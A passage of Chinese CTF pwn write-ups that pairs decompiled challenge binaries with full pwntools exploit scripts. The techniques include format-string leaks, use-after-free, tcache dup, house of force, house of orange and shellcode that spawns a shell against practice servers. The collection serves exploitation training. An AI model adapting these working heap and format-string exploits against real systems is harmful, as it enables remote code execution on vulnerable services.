02:0010│ rdi 0x7ffda7e80210 ◂— 0x2563303436343325 ('%34640c%')
03:0018│-138 0x7ffda7e80218 ◂— 0x6161616e68243031 ('10$hnaaa')
04:0020│-130 0x7ffda7e80220 —▸ 0x600c18 —▸ 0x7ce5bd887be0 (puts) ◂— endbr64 
05:0028│-128 0x7ffda7e80228 ◂— 0xa /* '\n' */
06:0030│-120 0x7ffda7e80230 ◂— 0x1100000
07:0038│-118 0x7ffda7e80238 ◂— 0x40 /* '@' */


00:0000│ rsp 0x7ffda7e80200 —▸ 0x7ffda7e80478 —▸ 0x7ffda7e82392 ◂— '/home/fofa/OilSpill'
01:0008│-148 0x7ffda7e80208 ◂— 0x1bdaf4e77
02:0010│-140 0x7ffda7e80210 ◂— 0x2563303436343325 ('%34640c%')
03:0018│-138 0x7ffda7e80218 ◂— 0x6161616e68243031 ('10$hnaaa')
04:0020│-130 0x7ffda7e80220 —▸ 0x600c18 —▸ 0x7ce5bd888750 (setvbuf+512) ◂— jmp setvbuf+356
05:0028│-128 0x7ffda7e80228 ◂— 0xa /* '\n' */
06:0030│-120 0x7ffda7e80230 ◂— 0x1100000
07:0038│-118 0x7ffda7e80238 ◂— 0x40 /* '@' */

```

## [HUBUCTF 2022 新生赛]singout

这里我们查看题目发现这个题目就只有一个nc没有附件因此我们直接查看这个文件

```shell
Here is your shell !,get you flag
root@pwn:~# ls
flag.txt
signout
start.sh
root@pwn:~# tac start.sh
root@pwn:~# sh: 1: start.sh: not found
root@pwn:~# tac ./*
root@pwn:~# ./flag.txt: 1: ./flag.txt: NSSCTF{b19ac267-379c-4290-9980-6d70ba63cee8}: not found
root@pwn:~# 

```

## [HGAME 2023 week1]simple_shellcode

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  mmap((void *)0xCAFE0000LL, 0x1000uLL, 7, 33, -1, 0LL);
  puts("Please input your shellcode:");
  read(0, (void *)0xCAFE0000LL, 0x10uLL);
  sandbox();
  MEMORY[0xCAFE0000]();
  return 0;
}
```

```shell
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0004
 0002: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0004
 0003: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0004: 0x06 0x00 0x00 0x00000000  return KILL
 
 [*] '/home/fofa/simple_shellcode/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

```

这里我们就可以知道大部分的信息已经够我们写了，这里我们的思路就非常的明确了1.orw获取flag，2.需要一个read函数

exp:

```py
from pwn import *
context(log_level='debug',arch='amd64', os='linux')
io = remote("node5.anna.nssctf.cn",22072)
# io = process("/home/fofa/simple_shellcode/vuln")

shellcode1=asm('''
mov rdi,rax;
mov rsi,0xCAFE0010;
syscall;
nop;
 ''')

io.sendafter("Please input your shellcode:\n",shellcode1)
shellcode2= asm('''
push 0x67616c66
mov rdi,rsp
xor esi,esi
push 2
pop rax
syscall
mov rdi,rax
mov rsi,rsp
mov edx,0x100
xor eax,eax
syscall
mov edi,1
mov rsi,rsp
push 1
pop rax
syscall
 ''')

io.send(asm(shellcraft.cat("./flag")))
print(io.recv())
print(io.recv())

```

## [TQLCTF 2022]unbelievable write

这里我们查看文件的数据

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+Ch] [rbp-4h]

  init(argc, argv, envp);
  while ( 1 )
  {
    while ( 1 )
    {
      write(1, "> ", 2uLL);
      v3 = read_int();
      if ( v3 != 3 )
        break;
      c3();
    }
    if ( v3 > 3 )
    {
LABEL_10:
      puts("wrong choice!");
    }
    else if ( v3 == 1 )
    {
      c1();
    }
    else
    {
      if ( v3 != 2 )
        goto LABEL_10;
      c2();
    }
  }
}
```

```c
unsigned __int64 c3()
{
  int fd; // [rsp+Ch] [rbp-54h]
  char buf[72]; // [rsp+10h] [rbp-50h] BYREF
  unsigned __int64 v3; // [rsp+58h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( target != 0xFEDCBA9876543210LL )
  {
    puts("you did it!");
    fd = open("./flag", 0, 0LL);
    read(fd, buf, 0x40uLL);
    puts(buf);
    exit(0);
  }
  puts("no write! try again?");
  return __readfsqword(0x28u) ^ v3;
}
```

```c
void c2()
{
  __int64 v0; // rbx
  int v1; // eax

  if ( golden == 1 )
  {
    golden = 0LL;
    v0 = ptr;
    v1 = read_int();
    free((void *)(v0 + v1));
  }
  else
  {
    puts("no!");
  }
}
```

```c
void c1()
{
  unsigned int size; // [rsp+4h] [rbp-Ch]
  void *size_4; // [rsp+8h] [rbp-8h]

  size = read_int();
  if ( size <= 0xF || size > 0x1000 )
  {
    puts("no!");
  }
  else
  {
    size_4 = malloc(size);
    readline((__int64)size_4, size);
    free(size_4);
  }
}
```

这里我们知道了几个这里几个数据的要给工作原理因此分析一下这个漏洞点

c1:出现了一个malloc的创建size要大于0xf小于0x1000并且创建完成以后会立马free这个chunk

c2：是一个free函数并且存在一个uaf的一个溢出因此我们可以暂时使用这个数据，并且他的free值是通过ptr的数据进行要给偏移量的技术的所以我们这里出现了一个文件溢出的漏洞

c3：这里是一个baekboor的要给漏洞函数要求是target的数据不能和这个相等因此我们就可以通过修改target来进行一个文件的一个获取了

```py
from pwn import *
p = remote("node4.anna.nssctf.cn",28150)
# p = process("/home/fofa/bin/pwn")
context.log_level = "debug"
binary = ELF('/home/fofa/bin/pwn')

target = 0x404080

def backdoor():
    p.sendlineafter("> ","3")

def add(size,content):
    p.recvuntil(b"> ")
    p.sendline(b"1")
    p.sendline(str(size).encode())
    p.sendline(content)

def free(position):
    p.recvuntil(b"> ")
    p.sendline(b"2")
    p.sendline(str(position).encode())

#
free('-0x290')
# gdb.attach(p)
add(0x280,b'\x00'*0x10+b'\x01'+b'\x00'*0x6f+p64(0)*8+p64(binary.got['free']))

add(0x90,p64(binary.plt['puts']))#overwrite free got-->puts plt

add(0x280,b'\x00'*0x10+b'\x01'+b'\x00'*0x6f+p64(0)*8+p64(target))
add(0x90,"aaaa")#overwrite target to get flag

backdoor()

p.interactive()
```

思路就是控制文件的一个控制块来进行一个控制

## gyctf_2020_some_thing_interesting

这里我们还是一个题目同样也是一个比较简单的题目这里我们直接上代码

```c
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  int v3; // [rsp+Ch] [rbp-14h] BYREF
  void *s; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  v3 = 0;
  memset(s, 0, 0x14uLL);
  sub_B10();
  s = (void *)sub_B7A();
  sub_C6A();
  while ( 1 )
  {
    printf("> Now please tell me what you want to do :");
    _isoc99_scanf("%d", &v3);
    switch ( v3 )
    {
      case 0:
        sub_D3D(s);
        break;
      case 1:
        sub_DCB();
        break;
      case 2:
        sub_112C();
        break;
      case 3:
        sub_130A();
        break;
      case 4:
        sub_142B();
        break;
      case 5:
        sub_D10();
      default:
        puts("Emmmmmm!Maybe you want Fool me!");
        sub_D10();
    }
  }
}
```



```c
unsigned __int64 __fastcall sub_D3D(const char *a1)
{
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  if ( dword_202010 )
  {
    puts("Now you are ....?");
    printf("# Your Code is ");
    printf(a1);
    putchar(10);
    puts("###############################################################################");
  }
  else
  {
    puts("Now you are Administrator!");
  }
  return __readfsqword(0x28u) ^ v2;
}
```



```c
unsigned __int64 sub_DCB()
{
  int i; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("#######################");
  puts("#     Create Oreo     #");
  puts("#---------------------#");
  for ( i = 1;
        i <= 9 && *((_QWORD *)&unk_2020E0 + i) && qword_202140[i] && *((_QWORD *)&unk_2021A0 + i) && qword_202080[i];
        ++i )
  {
    if ( i == 9 )
    {
      puts("#    so much Oreo!    #");
      puts("#######################");
      return __readfsqword(0x28u) ^ v2;
    }
  }
  printf("> O's length : ");
  _isoc99_scanf("%ld", &qword_202140[i]);
  if ( qword_202140[i] <= 0 || qword_202140[i] > 112 )
  {
    puts("Emmmmmm!Maybe you want Fool me!");
    sub_D10();
  }
  *((_QWORD *)&unk_2020E0 + i) = malloc(qword_202140[i]);
  printf("> O : ");
  read(0, *((void **)&unk_2020E0 + i), qword_202140[i]);
  printf("> RE's length : ");
  _isoc99_scanf("%ld", &qword_202080[i]);
  if ( qword_202080[i] <= 0 || qword_202080[i] > 112 )
  {
    puts("Emmmmmm!Maybe you want Fool me!");
    sub_D10();
  }
  printf("> RE : ");
  *((_QWORD *)&unk_2021A0 + i) = malloc(qword_202080[i]);
  read(0, *((void **)&unk_2021A0 + i), qword_202080[i]);
  puts("#---------------------#");
  puts("#      ALL Down!      #");
  puts("#######################");
  return __readfsqword(0x28u) ^ v2;
}
```



```c
unsigned __int64 sub_112C()
{
  signed int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("#######################");
  puts("#     Modify Oreo     #");
  puts("#---------------------#");
  printf("> Oreo ID : ");
  _isoc99_scanf("%d", &v1);
  if ( (unsigned int)v1 > 0xA
    || !*((_QWORD *)&unk_2020E0 + v1)
    || !qword_202140[v1]
    || !*((_QWORD *)&unk_2021A0 + v1)
    || !qword_202080[v1] )
  {
    puts("Emmmmmm!Maybe you want Fool me!");
    sub_D10();
  }
  printf("> O : ");
  read(0, *((void **)&unk_2020E0 + v1), qword_202140[v1]);
  printf("> RE : ");
  read(0, *((void **)&unk_2021A0 + v1), qword_202080[v1]);
  puts("#---------------------#");
  puts("#      ALL Down!      #");
  puts("#######################");
  return __readfsqword(0x28u) ^ v2;
}
```



```c
unsigned __int64 sub_130A()
{
  signed int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("#######################");
  puts("#     Delete Oreo     #");
  puts("#---------------------#");
  printf("> Oreo ID : ");
  _isoc99_scanf("%d", &v1);
  if ( (unsigned int)v1 > 0xA || !*((_QWORD *)&unk_2020E0 + v1) )
  {
    puts("Emmmmmm!Maybe you want Fool me!");
    sub_D10();
  }
  free(*((void **)&unk_2020E0 + v1));
  free(*((void **)&unk_2021A0 + v1));
  puts("#---------------------#");
  puts("#      ALL Down!      #");
  puts("#######################");
  return __readfsqword(0x28u) ^ v2;
}
```



```c
unsigned __int64 sub_142B()
{
  signed int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("#######################");
  puts("#      View Oreo      #");
  puts("#---------------------#");
  printf("> Oreo ID : ");
  _isoc99_scanf("%d", &v1);
  if ( (unsigned int)v1 > 0xA || !*((_QWORD *)&unk_2020E0 + v1) )
  {
    puts("Emmmmmm!Maybe you want Fool me!");
    sub_D10();
  }
  printf("# oreo's O is %s\n", *((const char **)&unk_2020E0 + v1));
  printf("# oreo's RE is %s\n", *((const char **)&unk_2021A0 + v1));
  puts("#---------------------#");
  puts("#      ALL Down!      #");
  puts("#######################");
  return __readfsqword(0x28u) ^ v2;
}
```

```c
char *sub_B7A()
{
  memset(s1, 0, 0x14uLL);
  puts("#######################");
  puts("#       Surprise      #");
  puts("#---------------------#");
  printf("> Input your code please:");
  read(0, s1, 0x13uLL);
  if ( strncmp(s1, "OreOOrereOOreO", 0xEuLL) )
  {
    puts("Emmmmmm!Maybe you want Fool me!");
    exit(0);
  }
  puts("#---------------------#");
  puts("#      ALL Down!      #");
  puts("#######################");
  return s1;
}
```

这里的几个结构就是我们大概的一个逻辑因此我们就直接上思路

1.上的free模块中还是纯在着一个uaf的错误，因此我们可以使用这个问题对其进行一个攻击

2.在sub_b7a这个文件模块中我们看到他需要一个密码才能进行一个运行下面的代码

3.在输入0以后他会传入我们s数据来进行一个输出这里出现了一个格式化字符串的泄露

剩下的就是攻击了

这里直接上exp

```py
from pwn import *
context.log_level='debug'
io = remote("node5.buuoj.cn",27781)
# io = process("/home/fofa/gyctf_2020_some_thing_interesting")
# libc = ELF("/home/fofa/桌面/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6")
libc = ELF("/home/fofa/buulibc/libc-2.23-64.so")
def add(size1, content1, size2, content2):
    io.recvuntil("#######################\n")
    io.sendline('1')
    io.recvuntil("> O's length : ")
    io.sendline(str(size1))
    io.recvuntil("> O : ")
    io.send(content1)
    io.recvuntil("> RE's length : ")
    io.sendline(str(size2))
    io.recvuntil("> RE : ")
    io.send(content2)


def delete(index):
    io.recvuntil("#######################\n")
    io.sendline('3')
    io.recvuntil("> Oreo ID : ")
    io.sendline(str(index))


def show(index):
    io.recvuntil("#######################\n")
    io.sendline('4')
    io.recvuntil("> Oreo ID : ")
    io.sendline(str(index))


def edit(index, content1, content2):
    io.recvuntil("#######################\n")
    io.sendline('2')
    io.recvuntil("> Oreo ID : ")
    io.sendline(str(index))
    io.recvuntil("> O : ")
    io.sendline(content1)
    io.recvuntil("> RE : ")
    io.sendline(content2)

io.recvuntil("> Input your code please:")
io.sendline("OreOOrereOOreO%17$p")

io.sendlineafter("> Now please tell me what you want to do :",'0')
io.recvuntil("# Your Code is OreOOrereOOreO")
io.recvuntil("0x")

start_main = int(io.recv(12),16)-0xf0-libc.sym['__libc_start_main']
info("libc.address:"+hex(start_main))
libc.address = start_main
malloc_hook = libc.sym['__malloc_hook']
one_gadget_16 = [0x45216,0x4526a,0xf02a4,0xf1147]

add(0x68,'aaaa',0x68,'aaaa')#1
delete(1)
# gdb.attach(io)
edit(1,b'\x00'*0x8,p64(malloc_hook-0x23))
one_gadget = libc.address+one_gadget_16[3]
payload=b'a'*(0x13)+p64(one_gadget)
add(0x68,b'a'*8,0x68,payload)

io.recvuntil("#######################\n")
io.sendline('1')
io.recvuntil("> O's length : ")
io.sendline(str(0x68))

# gdb.attach(io)

io.interactive()
```

## linkctf_2018.7_babypie

这个题目也是一个非常简单的题目了

这里直接上ida反编译，其他的思路就直接上代码了

```c
__int64 sub_960()
{
  _QWORD buf[6]; // [rsp+0h] [rbp-30h] BYREF

  buf[5] = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  memset(buf, 0, 32);
  puts("Input your Name:");
  read(0, buf, 0x30uLL);
  printf("Hello %s:\n", (const char *)buf);
  read(0, buf, 0x60uLL);
  return 0LL;
}
```



```py
from pwn import *
context.log_level='debug'
io = process("/home/fofa/babypie")
# io = remote("node5.buuoj.cn",28562)
payload = b'a' * 41
io.sendafter("Input your Name:",payload)
io.recvuntil("a" * 0x29)
canary =u64(io.recv(7).ljust(8,b'\x00'))<<8
# gdb.attach(io)
info("canary"+hex(canary))
gdb.attach(io)
payload= b'a' *40 + p64(canary) + p64(0) + b'\x42'
io.send(payload)

io.interactive()
```

总结这是一个非常简单的pie覆盖ret地址的最有一个字节

## houseoforange_hitcon_2016

这个题目思路就是非常明确了需要时候house of orenge来完成

```py
from pwn  import *
import functools
sh = remote("node5.buuoj.cn",28248)
# sh = process("/home/fofa/houseoforange_hitcon_2016")
LOG_ADDR = lambda x, y: log.success('{} ===> {}'.format(x, hex(y)))
int16 = functools.partial(int, base=16)
context.arch="amd64"
context.os="linux"
context.endian="little"

main_arena_offset = 0x3c4b20

libc = ELF("/home/fofa/桌面/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6")

def build_house(length:int, name, price:int=0xff, color:int=1):
    sh.sendlineafter("Your choice : ", "1")
    sh.sendlineafter("Length of name :", str(length))
    sh.sendafter("Name :", name)
    sh.sendlineafter("Price of Orange:", str(price))
    sh.sendlineafter("Color of Orange:", str(color))
    sh.recvuntil("Finish\n")

def see_house():
    sh.sendlineafter("Your choice : ", "2")
    name_msg = sh.recvline_startswith("Name of house : ")
    price_msg = sh.recvline_startswith("Price of orange : ")
    log.success("name_msg:{}\nprice_msg:{}".format(name_msg, price_msg))
    return name_msg, price_msg


def upgrade_house(length:int, name, price:int=0xff, color:int=1):
    sh.sendlineafter("Your choice : ", "3")
    sh.sendlineafter("Length of name :", str(length))
    sh.sendafter("Name:", name)
    sh.sendlineafter("Price of Orange: ", str(price))
    sh.sendlineafter("Color of Orange: ", str(color))
    sh.recvuntil("Finish\n")

build_house(0x10, "aaaa")

# change the size of top_chunk to 0xfa1
upgrade_house(0x100, b"a" * 0x38 + p64(0xfa1))

# house of orange
build_house(0x1000, "cccc")

# leak addr
build_house(0x400, b"a" * 8)
msg, _ = see_house()
leak_libc_addr = msg[0x18: 0x18+6]
leak_libc_addr = u64(leak_libc_addr.ljust(8, b"\x00"))

LOG_ADDR("leak_libc_addr", leak_libc_addr)
libc_base_addr = leak_libc_addr - main_arena_offset - 1640
LOG_ADDR("libc_base_addr", libc_base_addr)
io_list_all_addr = libc_base_addr + libc.sym["_IO_list_all"]

upgrade_house(0x10, "a" * 0x10)
msg, _ = see_house()
heap_addr = msg[0x20:0x26]
heap_addr = u64(heap_addr.ljust(8, b"\x00"))
LOG_ADDR("heap_addr", heap_addr)

payload = flat(p64(0) * 3 + p64(libc_base_addr + libc.sym["system"]),
                0x400 * "\x00",
                "/bin/sh\x00",
                0x61,
                0,
                io_list_all_addr-0x10,
                0,
                0x1,  # _IO_write_ptr
                0xa8 * b"\x00",
                heap_addr+0x10
                )
upgrade_house(0x600, payload)
sh.sendlineafter("Your choice : ", "1")
sh.interactive()

```

## [BSidesCF 2019]Runit

这个是一个简单的shellcode题目

```py
from pwn import *

io = remote("node5.buuoj.cn",29181)
io.send(asm(shellcraft.sh()))
io.interactive()
```

## gyctf_2020_force

这个题目就是要给比较普通的house of force这里我们先上exp：

```py
from pwn import *

r = remote("node5.buuoj.cn", 25985)
#r = process("./gyctf_2020_force")

context.log_level = 'debug'

elf = ELF("/home/fofa/gyctf_2020_force")
libc = ELF('/home/fofa/buulibc/libc-2.23-64.so')

one_gadget_16 = [0x45216,0x4526a,0xf02a4,0xf1147]

def add(size, content):
	r.recvuntil("2:puts\n")
	r.sendline('1')
	r.recvuntil("size\n")
	r.sendline(str(size))
	r.recvuntil("bin addr ")
	addr = int(r.recvuntil('\n').strip(), 16)
	r.recvuntil("content\n")
	r.send(content)
	return addr


def show(index):
	r.recvuntil("2:puts\n")
	r.sendline('2')

libc.address = add(0x200000, 'chunk0\n') + 0x200ff0
success('libc_base'+hex(libc.address))

heap_addr = add(0x18, b'a'*0x10+p64(0)+p64(0xFFFFFFFFFFFFFFFF))
success("heap_addr:"+hex(heap_addr))

top = heap_addr + 0x10
#gdb.attach(r)

malloc_hook = libc.sym['__malloc_hook']
success("malloc_hook"+hex(malloc_hook))
one_gadget = one_gadget_16[1] + libc.address
realloc = libc.sym["__libc_realloc"]
offset = malloc_hook - top
system = libc.sym['system']
bin_sh = libc.search('/bin/sh').__next__()
success("system:" + hex(system))
success("bin_sh" + hex(bin_sh))


add(offset-0x30, 'aaa\n')
add(0x10, b'a'*8+p64(one_gadget)+p64(realloc+0x10))

r.recvuntil("2:puts\n")
r.sendline('1')
r.recvuntil("size\n")
r.sendline(str(20))

r.interactive()

```

接下来就是原理了也是非常简单就是通过堆溢出把size的大小改大是的我们可以绕过用户请求的大小和topchunk现有size的一个验证

所有我们的一个思路也是非常简单就是通过获取libc，heap地址来获取到了malloc和top的一个地址来得到要给偏移这里的偏移就是 目标文件-topchunk地址-0x10对齐-返回地址，得到的一个偏移然后根据题目来更改，获取到目标的一个手法

这里主要是使用要给malloc来进行

## bjdctf_2020_YDSneedGrirlfriend

其实这个题目也是非常简单的一个思路了这里直接上exp了

```py
from pwn import *

context.log_level='debug'
# io = process("/home/fofa/bjdctf_2020_YDSneedGrirlfriend")
io = remote("node5.buuoj.cn",26282)
def add_chunk(size, content):
    io.sendlineafter("Your choice :",'1')
    io.sendlineafter("Her name size is :",str(size))
    io.sendlineafter("Her name is :", content)

def deleter_chunk(idx):
    io.sendlineafter("Your choice :", '2')
    io.sendlineafter("Index :", str(idx))

def show_chunk(idx):
    io.sendlineafter("Your choice :", '3')
    io.sendlineafter("Index :", str(idx))

add_chunk(0x20,'aa')
add_chunk(0x20,'bb')

deleter_chunk(0)
deleter_chunk(1)

add_chunk(0x10,p64(0x0400B9C))
show_chunk(0)
# gdb.attach(io)
io.interactive()
```

这里我们我们题目就是通过堆风水来控制一个chunk0的控制块，并且它存在一个uaf因此我们通过show来查看chunk0的数据因此就可以给他放到backdoor

## bcloud_bctf_2016

这个题目也是比较好玩的这里线上ida的汇编

```c
unsigned int sub_80487A1()
{
  char s[64]; // [esp+1Ch] [ebp-5Ch] BYREF
  char *v2; // [esp+5Ch] [ebp-1Ch]
  unsigned int v3; // [esp+6Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  memset(s, 0, 0x50u);
  puts("Input your name:");
  sub_804868D(s, 64, 10);
  v2 = (char *)malloc(0x40u);
  dword_804B0CC = (int)v2;
  strcpy(v2, s);
  sub_8048779(v2);
  return __readgsdword(0x14u) ^ v3;
}
```



```c
unsigned int sub_804884E()
{
  char s[64]; // [esp+1Ch] [ebp-9Ch] BYREF
  char *v2; // [esp+5Ch] [ebp-5Ch]
  char v3[68]; // [esp+60h] [ebp-58h] BYREF
  char *v4; // [esp+A4h] [ebp-14h]
  unsigned int v5; // [esp+ACh] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  memset(s, 0, 0x90u);
  puts("Org:");
  sub_804868D((int)s, 64, 10);
  puts("Host:");
  sub_804868D((int)v3, 64, 10);
  v4 = (char *)malloc(0x40u);
  v2 = (char *)malloc(0x40u);
  dword_804B0C8 = (int)v2;
  dword_804B148 = (int)v4;
  strcpy(v4, v3);
  strcpy(v2, s);
  puts("OKay! Enjoy:)");
  return __readgsdword(0x14u) ^ v5;
}
```

上面的这两个函数我们可以知道我们这里可以通过strcpy进行一个多一个字节数据因此我们可以通过这个offbyone进行一个溢出这里我们就可以泄露数据heap数据出来，接下来我们可以通过house of force进行要给堆地址的一个迁移，迁移到堆的bins大块中就可以控制整个堆块了，这里我们申请出0x804B120这个地址中所有堆块，最后我们可以控制这个bins中的任何一个free数据

```py
from pwn import *


context.log_level='debug'
# io = process("/home/fofa/bcloud_bctf_2016")
elf = ELF("/home/fofa/bcloud_bctf_2016")
libc = ELF("/home/fofa/buulibc/libc-2.23-32.so")
io = remote("node5.buuoj.cn",29264)
def add_chunk(size, content):
    io.sendlineafter('option--->>\n', '1')
    io.sendlineafter("Input the length of the note content:\n", str(size))
    io.sendlineafter("Input the content:\n", content)
    io.recvline()

def exit_chunk(idx, content):
    io.sendlineafter('option--->>\n', '3')
    io.sendlineafter("Input the id:\n", str(idx))
    io.sendlineafter("Input the new content:\n", content)
    io.recvline()


def del_chunk(idx):
    io.sendlineafter('option--->>\n', '4')
    io.sendlineafter("Input the id:\n", str(idx))

io.sendafter("Input your name:\n", 'a' * 0x40)
io.recvuntil('a'*0x40)
heap_addr = u32(io.recv(4))
info("heap_addr:"+hex(heap_addr))

io.sendafter("Org:\n", b'b' * 0x40)
io.sendafter("Host:\n", p32(0xffffffff) + (0x40 - 4) * b'a')
# io.recvuntil("OKay! Enjoy:)\n")

top_chunk = heap_addr+0xd0
offset = 0x0804B120 -top_chunk-20

add_chunk(offset,'')
for i in range(4):
    add_chunk(0x40,'aaa')

exit_chunk(1, p32(0x804b120) * 2 + p32(elf.got['free']) + p32(elf.got['printf']))
exit_chunk(2, p32(elf.plt['puts']))

del_chunk(3)

libc.address=u32(io.recv(4))-libc.sym['printf']
info("libc_base:"+hex(libc.address))
exit_chunk(1, p32(0x804b130) * 2 + p32(elf.got['free']) * 2 + b'/bin/sh')

exit_chunk(2, p32(libc.sym['system']))

del_chunk(0)
# del_chunk(3)
# gdb.attach(io)

io.interactive()
```

## picoctf_2018_echooo

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  __gid_t v3; // [esp+14h] [ebp-94h]
  FILE *stream; // [esp+18h] [ebp-90h]
  char s[64]; // [esp+1Ch] [ebp-8Ch] BYREF
  char v6[64]; // [esp+5Ch] [ebp-4Ch] BYREF
  unsigned int v7; // [esp+9Ch] [ebp-Ch]

  v7 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  v3 = getegid();
  setresgid(v3, v3, v3);
  memset(s, 0, sizeof(s));
  memset(s, 0, sizeof(s));
  puts("Time to learn about Format Strings!");
  puts("We will evaluate any format string you give us with printf().");
  puts("See if you can get the flag!");
  stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    puts(
      "Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.");
    exit(0);
  }
  fgets(v6, 64, stream);
  while ( 1 )
  {
    printf("> ");
    fgets(s, 64, stdin);
    printf(s);
  }
}
```

这里我们思路就是一个格式化字符串的泄露这里我们付上gdb数据

```shell
pwndbg> stack 30
00:0000│ esp 0xff853570 —▸ 0xff85359c ◂— 'aaaa\n'
01:0004│-0b4 0xff853574 ◂— 0x40 /* '@' */
02:0008│-0b0 0xff853578 —▸ 0xf0eb15c0 (_IO_2_1_stdin_) ◂— 0xfbad2088
03:000c│-0ac 0xff85357c —▸ 0x8048647 (main+76) —▸ 0xff6c8589 ◂— 0
04:0010│-0a8 0xff853580 ◂— 0
05:0014│-0a4 0xff853584 ◂— 0
06:0018│-0a0 0xff853588 ◂— 0x1000
07:001c│-09c 0xff85358c —▸ 0xff8536f4 —▸ 0xff854369 ◂— '/home/fofa/PicoCTF_2018_echooo'
08:0020│-098 0xff853590 —▸ 0xff8535dc ◂— 'flag{asdffsadf_asdfasdf_asdfasdf}'
09:0024│-094 0xff853594 ◂— 0x3e8
0a:0028│-090 0xff853598 —▸ 0x89091a0 ◂— 0xfbad2498
0b:002c│ eax 0xff85359c ◂— 'aaaa\n'
0c:0030│-088 0xff8535a0 ◂— 0xa /* '\n' */
0d:0034│-084 0xff8535a4 ◂— 0
... ↓        13 skipped
1b:006c│-04c 0xff8535dc ◂— 'flag{asdffsadf_asdfasdf_asdfasdf}'
1c:0070│-048 0xff8535e0 ◂— '{asdffsadf_asdfasdf_asdfasdf}'
1d:0074│-044 0xff8535e4 ◂— 'ffsadf_asdfasdf_asdfasdf}'
pwndbg> 

```

通过gdb可以直接获取到文件的输出

```py
from pwn import *

# io = process("/home/fofa/PicoCTF_2018_echooo")

io = remote("node5.buuoj.cn",29456)


io.sendlineafter('> ','%8$s')
# gdb.attach(io)

io.interactive()

```

## ciscn_2019_s_6

直接上ida这里

```c
unsigned __int64 call()
{
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Please input the index:");
  __isoc99_scanf("%d", &v1);
  if ( *((_QWORD *)&heap_addr + v1) )
    free(**((void ***)&heap_addr + v1));//主要的漏洞点在这个位置存在要给uaf漏洞
  puts("You try it!");
  puts("Done");
  return __readfsqword(0x28u) ^ v2;
}
```

加上我们可以查看这里上面的题目他是一个2.27的一个libc，并且是一个2.27的一个低版本的libc因此这里我们直接使用tachar dup进行一个攻击这里我直接上一个exp：

```py
from pwn import *

# from main import delete
context.log_level='debug'
libc = ELF("/home/fofa/桌面/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6")
# io = process("/home/fofa/ciscn_s_6")
io = remote("node5.buuoj.cn",29375)
def add_chunk(idx,size,name,content):
    io.sendlineafter("choice:",'1')
    io.sendlineafter("Please input the size of compary's name",str(size))
    io.sendlineafter("please input name:",name)
    io.sendlineafter("please input compary call:",content)

def show_chunk(idx):
    io.sendlineafter("choice:",'2')
    io.sendlineafter("Please input the index:",str(idx))

def delete_chunk(idx):
    io.sendlineafter("choice:", '3')
    io.sendlineafter("Please input the index:", str(idx))

add_chunk(0,0x80,'aaa','aaa')
add_chunk(1,0x20,'bbb','bbb')
add_chunk(2,0x20,'ccc','ccc')
for i in range(7):
    delete_chunk(0)

delete_chunk(0)
show_chunk(0)
io.recvuntil("name:")
libc.address = u64(io.recv(7)[-6:].ljust(8,b'\x00'))-0x3ebca0
info("libc.address:"+hex(libc.address))

free_addr = libc.sym['__free_hook']
system_addr = libc.sym['system']

delete_chunk(1)
delete_chunk(1)
delete_chunk(1)

add_chunk(3,0x20,p64(free_addr),'pppp')
add_chunk(4,0x20,'pppp','pppp')
add_chunk(5,0x20,p64(system_addr),'pppp')
add_chunk(6,0x20,'/bin/sh','pppp')

delete_chunk(6)

# gdb.attach(io)

io.interactive()
```

## [CISCN 2021 初赛]lonelywolf

这里我们直接看ida这里是一个堆题

```c
unsigned __int64 sub_B60()
{
  size_t size_1; // rbx
  void *buf; // rax
  size_t size; // [rsp+0h] [rbp-18h] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-10h]

  v4 = __readfsqword(0x28u);
  __printf_chk(1, "Index: ");
  __isoc99_scanf("%ld", &size);
  if ( !size )
  {
    __printf_chk(1, "Size: ");
    __isoc99_scanf("%ld", &size);
    size_1 = size;
    if ( size > 0x78 )
    {
      __printf_chk(1, "Too large");
    }
    else
    {
      buf = malloc(size);
      if ( buf )
      {
        ::size = size_1;
        ::buf = buf;
        puts("Done!");
      }
      else
      {
        puts("allocate failed");
      }
    }
  }
  return __readfsqword(0x28u) ^ v4;
}

unsigned __int64 sub_DA0()
{
  _BYTE *buf; // rbx
  char *v1; // rbp
